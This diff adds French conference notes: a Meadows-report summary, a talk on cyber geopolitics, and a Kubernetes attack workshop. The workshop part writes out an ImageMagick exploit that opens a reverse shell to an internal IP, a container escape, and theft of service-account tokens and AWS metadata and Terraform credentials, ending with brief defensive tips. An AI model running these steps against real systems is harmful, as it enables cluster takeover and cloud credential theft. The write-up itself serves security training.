@@ -522,3 +522,234 @@ Comment modéliser l'état du monde en 2100 ? Pas la question la plus simple ! M
 ----
 
 ==== Notes
+
+Rapport Meadows
+
+Identifier les systèmes majeur
+Alimentaire / industriel / population / pollution / ressources (renouvelable - non-renouv)
+
+Interaction entre systèmes
+
+Quantifier les interactions
+
+Courbes des évolutions (l'important c'est la forme des courbes, pas les valeurs)
+
+=== Cybersécurité et cyberdéfense : un sujet géopolitique
+
+==== Abstract
+
+.Speakers : Guillaume Poupard
+----
+La cybersécurité est souvent vue, à juste titre, sous un angle technique, opérationnel et réglementaire. L'incroyable évolution de la menace informatique nous concerne tous, à titre individuel, au niveau des organisations mais également à l'échelle des Etats. Dans un contexte général de fortes tensions géopolitiques, le cyber est devenu un ingrédient majeur dont l'usage se systématise dans des conflits qualifiés « d'hybrides ». Passionnante et effrayante, cette militarisation de l'espace numérique nous concerne toutes et tous !
+----
+
+==== Notes
+
+80% du temps passé à l'ANSII, c'est pas sur la cybersec mais l'espionnage
+Bureaux des légendes une bonne référence
+Espionnage le vrai plus vieux métier du monde :)
+
+Attaquants très discrets
+Victimes ne s'en rendent pas compte (ça prend des mois voire des années pour le découvrir)
+
+Cyber devenu un sujet géopolique
+Possibilité de paraliser des systèmes / états entier
+
+Livre blanc 2008
+https://fr.wikipedia.org/wiki/Livre_blanc_sur_la_défense_et_la_sécurité_nationale_2008#:~:text=Le%20Livre%20blanc%20sur%20la,France%20de%202009%20à%202020.
+
+En France, on a un problème, donc on en fait une loi
+Les OIV doivent se protéger des attaques cyber
+12 secteurs dans les OIV
+* Énergie
+* Transports
+* Eau
+* Santé
+* Télécommunications
+* Défense
+* Finances
+* Alimentation
+* Technologies de l'information et de la communication
+* Recherche
+* Industrie chimique
+* Espace
+
+Cyber attaque TV5 Monde 2015
+Attribuer une attaque à qqun c'est qqch de très difficile
+Source au final --> l'Est
+
+2017 - Wannacry
+GB le service de santé s'est bloqué
+
+Notpetya
+Efface les données, donc pas vraiment un rancçngiel
+Visait princiapelement l'Ukraine
+Saint Gobbin impacter par Notpetya, usine en Ukraine opérait une usine là-bas (bien que vendu 2 ans auparavant)
+Ukraine toujours attaqué par l'Est maintenant, mais a su mieux se protéger
+
+
+=== Si j'étais un hacker, comment est-ce que je prendrais le contrôle de votre cluster Kubernetes
+
+==== Abstract
+
+.Speakers : Thibault Lengagne & Alexandre Hervé
+----
+Un cluster Kubernetes est un orchestrateur de conteneurs qui permet de déployer et de gérer des applications de manière efficace. Cependant, en raison de sa complexité, un tel cluster peut facilement être vulnérable aux attaques et sa sécurité peut être compromise. Pour éviter cela, la meilleure option reste de tester ses défenses en se mettant dans la peau d'un attaquant !
+Devenez vous-même un hacker pour la durée de cet atelier. Vous allez réaliser les différentes étapes de compromission un cluster Kubernetes et du compte AWS sous-jacent. Nous aborderons différentes techniques d'attaques en commençant par l'exécution de commandes sur un pod puis, grâce à différentes élévations de privilège, la compromission totale du cluster. Nous mettrons également en place des mesures préventives dans le but d'empêcher ces différentes failles de sécurité d'être exploitées.
+----
+
+==== Notes
+
+https://www.microsoft.com/en-us/security/blog//wp-content/uploads/2020/04/k8s-matrix.png
+
+
+Ecoute sur l'attaque box
+....
+nc -lvnp 50986
+....
+
+Créer une image avec l'exploit
+....
+$ cat exploit.mvg
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|setsid /bin/bash -i >/dev/tcp/10.100.1.188/50986 0<&1 2>&1 &")'
+pop graphic-context
+....
+
+Dans le shell interactif
+....
+python -c 'import pty; pty.spawn("/bin/bash")'
+Press Ctrl+Z
+$ stty raw -echo
+Press fg and then Enter
+....
+
+Une fois connecté dans le pod:
+Lister les process
+....
+ps aux
+....
+
+Lister les capacités du container
+....
+capsh --print
+....
+
+Pour sortir du container et aller sur node:
+....
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+....
+
+Lister les containers ou les points de montage
+....
+ctr -n k8s.io c list
+mount | grep kube
+....
+
+....
+#!/bin/bash
+
+# Download kubectl
+cd /tmp/
+curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
+chmod +x ./kubectl
+mv ./kubectl /bin
+alias kubectl="kubectl  --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true"
+
+# Tries all the token found to access kube-api
+# Tries to get the secrets using each token
+
+# for path in $(mount | grep kube-api | awk '{print $3}'); do
+#   TOKEN=$(cat $path/token);
+#   echo "==================================="
+#   echo $TOKEN;
+#   echo "Service account : $(python /tmp/decode_jwt_token.py $path/token | jq -r '.sub')"
+#   echo "-----------------------------------"
+#   kubectl get secrets -A;
+#   echo "==================================="
+# done
+
+# Look for admin token
+ctr -n k8s.io container list
+PID=$(ctr -n k8s.io container list | grep nginx | awk '{print $1}')
+crictl exec -it $PID /bin/sh
+
+# Get token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Two tokens should work the ingress controller service account and the busybox service account
+export TOKEN=<...>
+
+# You can list but not read
+kubectl get secrets -n kube-system --token=$TOKEN
+
+# Tips add -o yaml pour avoir la sortie
+....
+
+
+Attack AWS
+....
+#!/bin/bash
+
+#
+# On the node shell
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+
+# Explore API
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
+
+# Get name of the role
+node_group=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+# Get the role
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/$node_group -o creds.json
+
+# Export the body of your response in a json file and save it on your local machine
+# Use the python script to obtain the format of the aws credentials
+python /tmp/export-credentials-aws.py creds.json
+
+# Get cluster name and API Endpoint
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data
+
+
+# # Install AWS
+# curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+# python -c "import zipfile; zip_ref=zipfile.ZipFile('awscliv2.zip', 'r');zip_ref.extractall('/tmp/')"
+# chmod +x ./aws/install
+# ./aws/install
+# chmod +x /usr/local/bin/aws
+# export AWS_PAGER=""
+
+# GO to your machin
+
+# List bucket
+aws s3api list-buckets
+aws s3 cp s3://devoxx-eks-attack-terraform-backend/poc /tmp/state.json
+
+cat /tmp/state.json| jq '.resources[].name'  | grep admin
+cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")'
+
+
+
+unset AWS_SECRET_ACCESS_KEY
+unset AWS_ACCESS_KEY_ID
+unset AWS_SESSION_TOKEN
+export AWS_ACCESS_KEY_ID=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.id')
+export AWS_SECRET_ACCESS_KEY=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.secret')
+
+aws iam list-users
+
+# Delete the key to prevent exploitation
+aws iam delete-access-key --access-key-id "<key>" --user-name admin-test
+....
+
+
+Pour se défendre --> Falco
+https://falco.org
+
+imds v2 pour éviter plusieurs risques de sécu: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
+
+Pas de containers priviligés melangés avec des containers non priviligiés
+Les mettre sur des nodes dédiés
+
